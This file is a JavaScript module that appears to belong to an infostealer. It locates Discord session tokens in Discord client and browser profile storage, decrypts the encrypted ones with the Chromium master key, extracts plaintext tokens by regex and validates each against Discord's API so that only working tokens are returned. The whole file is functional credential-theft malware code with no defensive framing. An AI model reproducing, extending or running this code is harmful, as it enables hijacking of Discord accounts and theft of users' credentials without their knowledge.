const {
    getProfiles
} = require("./../../utils/harware/getUsers.js");

const {
    decryptAES256GCM
} = require("./../browsers/crypto.js");

const {
    Chromium,
} = require("./../browsers/masterkey.js");

const {
    getDiscordPaths,
    getChromiumBrowsers,
    getGeckoBrowsers
} = require("./../browsers/paths.js");

const {
    Transform
} = require("stream");

const axios = require("axios");
const path  = require("path");
const fs    = require("fs");
const util  = require("util");

const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;

const accountRegexs = [
    /[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g,
    /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g,
    /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,
    /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,
    /mfa\.[\w-]{84}/g
];

const validateToken = async (token) => {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: { Authorization: token }
        });
        return response.status === 200;
    } catch {
        return false;
    }
}

const extractDecryptTokens = async (filePath, pathTail, allTokens) => {
    try {
        const chromium = new Chromium();
        const key = chromium.getMasterKey(pathTail);
        
        const transformStream = new Transform({
            transform(chunk, encoding, callback) {
                const lines = chunk.toString().split('\n');
                for (const line of lines) {
                    if (filePath.includes('cord')) {
                        const match = line.match(encryptedRegex);
                        if (match) {
                            try {
                                const token = decryptAES256GCM(key, match);
                                allTokens.push(token);
                            } catch (err) {
                            }
                        }
                    }
                }
                callback();
            }
        });
        const fileStream = fs.createReadStream(filePath, 'utf8');
        await new Promise((resolve, reject) => {
            fileStream
                .pipe(transformStream)
                .on('finish', resolve)
                .on('error', reject)
        });
    } catch (err) {
    }
};

const dbsFiles = async (directory, allTokens) => {
    try {
        const fileNames = await fs.promises.readdir(directory);
        const fileProcesses = fileNames
            .filter(fileName => fileName.endsWith('.log') || fileName.endsWith('.ldb'))
            .map(fileName => {
                const filePath = path.join(directory, fileName);
                const pathTail = directory.split(path.sep).slice(0, -3).join(path.sep);
                return extractDecryptTokens(filePath, pathTail, allTokens);
            });
        await Promise.all(fileProcesses);
    } catch (err) {
    }
};

const getBrowserProfiles = async (user) => {
    const browsersPath = [
        ...Object.values(getChromiumBrowsers(user)),
        ...Object.values(getGeckoBrowsers(user))
    ];
    let browsersProfiles = [];
    for (const browser of browsersPath) {
        try {
            const profiles = getProfiles(browser, path.basename(browser));
            browsersProfiles.push(...profiles.map(profile => profile.path));
        } catch (err) {
        }
    }
    return browsersProfiles;
};

const pathExists = async (value) => {
    try {
        await util.promisify(fs.access)(value);
        return true;
    } catch {
        return false;
    }
};

const discordFindTokens = async (user) => {
    let allTokens = [];

    const pathProcesses = Object.values(getDiscordPaths(user))
        .filter(async value => await pathExists(value))
        .map(value => dbsFiles(value, allTokens));

    await Promise.all(pathProcesses);

    const browsersProfiles = await getBrowserProfiles(user);
    const browserProcesses = browsersProfiles.map(async (profile) => {
        if (await pathExists(profile)) {
            const files = await fs.promises.readdir(profile);
            const fileProcesses = files
                .filter(file => file.endsWith('.log') || file.endsWith('.ldb'))
                .map(file => {
                    const filePath = path.join(profile, file);
                    return fs.promises.readFile(filePath, 'utf-8').then(content => {
                        for (const regex of accountRegexs) {
                            allTokens.push(...content.match(regex) || []);
                        }
                    });
                });

            await Promise.all(fileProcesses);
        }
    });

    await Promise.all(browserProcesses);

    const uniqueTokens = Array.from(new Set(allTokens));
    const validatedTokens = await Promise.all(
        uniqueTokens.map(async token => (
            await validateToken(token) ? token : null
        ))
    );

    const tokens = validatedTokens.filter(token => token !== null);

    return tokens;
};

module.exports = {
    discordFindTokens
};
